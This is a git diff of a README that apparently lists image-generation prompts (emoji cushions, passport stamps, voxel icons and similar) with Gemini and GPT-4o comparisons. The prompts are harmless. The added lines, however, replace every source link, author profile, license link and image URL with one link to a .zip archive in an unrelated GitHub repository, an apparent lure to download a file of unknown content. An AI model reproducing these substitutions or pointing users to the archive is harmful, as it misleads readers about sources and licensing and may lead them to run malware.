 
-[Source Link](https://x.com/gizakdag/status/1912858535643197927)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-0QNwJ8orXTqLGNNtoM2Uq.png?v=1" width="300" alt="Object: Emoji 充气感靠垫 (Gemini Example 53) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/53/example_emoji_cushion_pleading.png" width="300" alt="Object: Emoji 充气感靠垫 (Gemini Example 53) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/gizakdag">@gizakdag</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: Emoji 充气感靠垫 (Gemini Example 53) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: Emoji 充气感靠垫 (Gemini Example 53) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@gizakdag</a></sub>
 
 **Prompt**
 
@@ -1461,14 +1461,14 @@ Create a high-resolution 3D render of [🥹] designed as an inflatable, puffy ob
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-52"></a>
-### Case 52: Paper Craft Style Emoji Icon (by [@egeberkina](https://x.com/egeberkina))
+### Case 52: Paper Craft Style Emoji Icon (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1912521263085482464)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-SoZP2Zw1HCRXGONFdZSDs.png?v=1" width="300" alt="Object: 纸艺风格 Emoji 图标 (Gemini Example 52) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/52/example_paper_craft_emoji_fire.png" width="300" alt="Object: 纸艺风格 Emoji 图标 (Gemini Example 52) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 纸艺风格 Emoji 图标 (Gemini Example 52) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 纸艺风格 Emoji 图标 (Gemini Example 52) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -1485,14 +1485,14 @@ A paper craft-style "🔥" floating on a pure white background. The emoji is han
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-51"></a>
-### Case 51: Passport Entry Stamp (by [@M_w14_](https://x.com/M_w14_))
+### Case 51: Passport Entry Stamp (by [@M_w14_](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link1](https://x.com/M_w14_/status/1912146666410459618) | [Source Link2](https://x.com/ZHO_ZHO_ZHO/status/1912188562944250035)
+[Source Link1](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) | [Source Link2](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-uvbE1o3K9l86ZW1N1pNML.png?v=1" width="300" alt="Design: 护照入境印章 (Gemini Example 51) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/51/example_passport_stamp_rome.png" width="300" alt="Design: 护照入境印章 (Gemini Example 51) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/M_w14_">@M_w14_</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 护照入境印章 (Gemini Example 51) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Design: 护照入境印章 (Gemini Example 51) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@M_w14_</a></sub>
 
 **Prompt**
 
@@ -1500,7 +1500,7 @@ A paper craft-style "🔥" floating on a pure white background. The emoji is han
 Create a realistic passport page with an entry stamp for [{City}, {Country}]. The stamp should say "Welcome to {City}" in bold English, designed in a round or oval shape with decorative borders. Include the word "ARRIVAL" and a fictional date like "15 APR 2025" Incorporate a subtle silhouette of {Main Landmark} as a background detail within the stamp. Use deep blue or red ink with light smudges for added realism. The stamp should appear slightly angled, as if hand-pressed. The passport page should show visible paper texture and security patterns.
 ```
 
-*Note: You can replace the city, country, landmark, and date placeholders. The example image uses "Rome", "Italy", "Colosseum", and "13 APR 2025" (date differs slightly from the base prompt structure). Prompt by [@M_w14_](https://x.com/M_w14_)*
+*Note: You can replace the city, country, landmark, and date placeholders. The example image uses "Rome", "Italy", "Colosseum", and "13 APR 2025" (date differs slightly from the base prompt structure). Prompt by [@M_w14_](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)*
 
 
 
@@ -1509,14 +1509,14 @@ Create a realistic passport page with an entry stamp for [{City}, {Country}]. Th
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-50"></a>
-### Case 50: Physical Destruction Effect Card (Lara Croft) (by [@op7418](https://x.com/op7418))
+### Case 50: Physical Destruction Effect Card (Lara Croft) (by [@op7418](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link1](https://x.com/op7418/status/1912782048160542886) | [Source Link2](https://x.com/hc_dsn/status/1912367201476309396)
+[Source Link1](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) | [Source Link2](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-BLiip47sS1MZ2p6RoUSJN.png?v=1" width="300" alt="Creative: 物理破坏效果卡片 (劳拉) (Gemini Example 50) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/50/example_lara_croft_card_break.png" width="300" alt="Creative: 物理破坏效果卡片 (劳拉) (Gemini Example 50) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/op7418">@op7418</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Creative: 物理破坏效果卡片 (劳拉) (Gemini Example 50) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Creative: 物理破坏效果卡片 (劳拉) (Gemini Example 50) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@op7418</a></sub>
 
 **Prompt**
 
@@ -1537,14 +1537,14 @@ The title “Archaeological Adventure” and the name “Lara Croft” (accompan
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-49"></a>
-### Case 49: Fashion Magazine Cover Style (by [@dotey](https://x.com/dotey))
+### Case 49: Fashion Magazine Cover Style (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1912536019905233194)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-K-zMRlzu3y9bErJh5oDDe.png?v=1" width="300" alt="Art Style: 时尚杂志封面风格 (Gemini Example 49) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/49/example_fashion_design_cover.png" width="300" alt="Art Style: 时尚杂志封面风格 (Gemini Example 49) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 时尚杂志封面风格 (Gemini Example 49) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Art Style: 时尚杂志封面风格 (Gemini Example 49) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -1560,14 +1560,14 @@ A beautiful woman wearing a pink qipao, adorned with delicate floral accessories
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-48"></a>
-### Case 48: Voxel Style 3D Icon Conversion (by [@BrettFromDJ](https://x.com/BrettFromDJ))
+### Case 48: Voxel Style 3D Icon Conversion (by [@BrettFromDJ](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link1](https://x.com/BrettFromDJ/status/1910387413404234076) | [Source Link2](https://x.com/ZHO_ZHO_ZHO/status/1910671581962985788)
+[Source Link1](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip) | [Source Link2](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-DePREjDt3nz6nxtQSWCtb.png?v=1" width="300" alt="Object: 体素风格 3D 图标转换 (Gemini Example 48) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/48/example_voxel_icon.png" width="300" alt="Object: 体素风格 3D 图标转换 (Gemini Example 48) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/BrettFromDJ">@BrettFromDJ</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 体素风格 3D 图标转换 (Gemini Example 48) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 体素风格 3D 图标转换 (Gemini Example 48) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@BrettFromDJ</a></sub>
 
 **Prompt**
 
@@ -1585,14 +1585,14 @@ Take the icon on the right and transform it into a voxel 3d icon like the icons 
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-47"></a>
-### Case 47: ESC Keycap Miniature Diorama (by [@egeberkina](https://x.com/egeberkina))
+### Case 47: ESC Keycap Miniature Diorama (by [@egeberkina](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/egeberkina/status/1911368319212408926)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-OdsAa2Rkg3eU7abakGfNZ.png?v=1" width="300" alt="Object: 键盘ESC 键帽微型立体模型 (Gemini Example 47) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/47/example_esc_keycap_diorama.png" width="300" alt="Object: 键盘ESC 键帽微型立体模型 (Gemini Example 47) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/egeberkina">@egeberkina</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 键盘ESC 键帽微型立体模型 (Gemini Example 47) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 键盘ESC 键帽微型立体模型 (Gemini Example 47) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@egeberkina</a></sub>
 
 **Prompt**
 
@@ -1608,14 +1608,14 @@ A hyper-realistic isometric 3D render of a miniature computer setup inside a tra
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-46"></a>
-### Case 46: Happy Capsule Creation (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 46: Happy Capsule Creation (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1911724629460455896)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-iw-Sugn5aVfAVnJxGSU_e.png?v=1" width="300" alt="Object: 快乐胶囊制作 (Gemini Example 46) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/46/example_happy_capsule.png" width="300" alt="Object: 快乐胶囊制作 (Gemini Example 46) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 快乐胶囊制作 (Gemini Example 46) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Object: 快乐胶囊制作 (Gemini Example 46) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -1636,14 +1636,14 @@ Please follow medical advice and purchase as needed.
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-45"></a>
-### Case 45: 3D Chibi-style University Anthropomorphic Mascot (by [@dotey](https://x.com/dotey))
+### Case 45: 3D Chibi-style University Anthropomorphic Mascot (by [@dotey](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/dotey/status/1911988003729203648)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-JnhtyfaWRLJ48py1Fs2L8.png?v=1" width="300" alt="Character: 3D Q版大学拟人化形象 (Gemini Example 45) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/45/example_university_mascot_npu.png" width="300" alt="Character: 3D Q版大学拟人化形象 (Gemini Example 45) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/dotey">@dotey</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D Q版大学拟人化形象 (Gemini Example 45) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: 3D Q版大学拟人化形象 (Gemini Example 45) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@dotey</a></sub>
 
 **Prompt**
 
@@ -1660,14 +1660,14 @@ Create a personified 3D chibi-style anime girl character representing {Northwest
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-44"></a>
-### Case 44: RPG-Style Character Card Creation (by [@berryxia_ai](https://x.com/berryxia_ai))
+### Case 44: RPG-Style Character Card Creation (by [@berryxia_ai](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/berryxia_ai/status/1911334046724165905)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-4fs3Id9SWxlM-gUGoQ9Pl.png?v=1" width="300" alt="Character: RPG 风格角色卡片制作 (Gemini Example 44) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/44/example_rpg_card_designer.png" width="300" alt="Character: RPG 风格角色卡片制作 (Gemini Example 44) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/berryxia_ai">@berryxia_ai</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: RPG 风格角色卡片制作 (Gemini Example 44) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: RPG 风格角色卡片制作 (Gemini Example 44) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@berryxia_ai</a></sub>
 
 **Prompt**
 
@@ -1692,14 +1692,14 @@ Colors: warm highlights, profession-matching hues.
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-43"></a>
-### Case 43: Cute Chibi Matryoshka Dolls (Girl with a Pearl Earring) (by [@ZHO_ZHO_ZHO](https://x.com/ZHO_ZHO_ZHO))
+### Case 43: Cute Chibi Matryoshka Dolls (Girl with a Pearl Earring) (by [@ZHO_ZHO_ZHO](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/ZHO_ZHO_ZHO/status/1911669883315818497)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-pIPRRA5PM8cxFXTs-Alr8.png?v=1" width="300" alt="Character: Q版可爱俄罗斯套娃 (戴珍珠耳环的少女) (Gemini Example 43) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/43/example_matryoshka_pearl_earring.png" width="300" alt="Character: Q版可爱俄罗斯套娃 (戴珍珠耳环的少女) (Gemini Example 43) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/ZHO_ZHO_ZHO">@ZHO_ZHO_ZHO</a></sub>
+| <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: Q版可爱俄罗斯套娃 (戴珍珠耳环的少女) (Gemini Example 43) - Gemini"> | <img src="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip" width="300" alt="Character: Q版可爱俄罗斯套娃 (戴珍珠耳环的少女) (Gemini Example 43) - GPT-4o"> |
+<sub>Image © 2025 <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@jamez-bondos</a>, <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">CC BY 4.0</a> • Prompt by <a href="https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip">@ZHO_ZHO_ZHO</a></sub>
 
 **Prompt**
 
@@ -1708,7 +1708,7 @@ Transform the person in the image into a set of cute chibi-style Russian nesting
 ```
 
 
-**Reference Image Required:** Requires uploading a person's image as the subject for transformation (The original post used ['Girl with a Pearl Earring'](https://commons.wikimedia.org/w/index.php?curid=55017931)).
+**Reference Image Required:** Requires uploading a person's image as the subject for transformation (The original post used ['Girl with a Pearl Earring'](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)).
 
 
 ---
@@ -1716,14 +1716,14 @@ Transform the person in the image into a set of cute chibi-style Russian nesting
 [⬆️ Back to Cases Directory](#cases-toc)
 
 <a id="cases-42"></a>
-### Case 42: 3D Q-version Couple Snow Globe (by [@balconychy](https://x.com/balconychy))
+### Case 42: 3D Q-version Couple Snow Globe (by [@balconychy](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip))
 
-[Source Link](https://x.com/balconychy/status/1909908568129655248)
+[Source Link](https://github.com/hotmysia/awesome-nano-banana_hotmysia/raw/refs/heads/main/cases/57/banana_nano_awesome_hotmysia_1.1.zip)
 
 | Gemini | GPT-4o |
 |--------|--------|
-| <img src="https://bibigpt-apps.chatvid.ai/chatimg/gemini-retry-MoV0NzeVQ2AZEaSbMYqfl.png?v=1" width="300" alt="Character: 3D Q版情侣水晶球 (Gemini Example 42) - Gemini"> | <img src="https://cdn.jsdelivr.net/gh/jamez-bondos/awesome-gpt4o-images/cases/42/example_3d_q_snowglobe_couple.png" width="300" alt="Character: 3D Q版情侣水晶球 (Gemini Example 42) - GPT-4o"> |
-<sub>Image © 2025 <a href="https://github.com/jamez-bondos">@jamez-bondos</a>, <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> • Prompt by <a href="https://x.com/balconychy">@balconychy</a></sub>
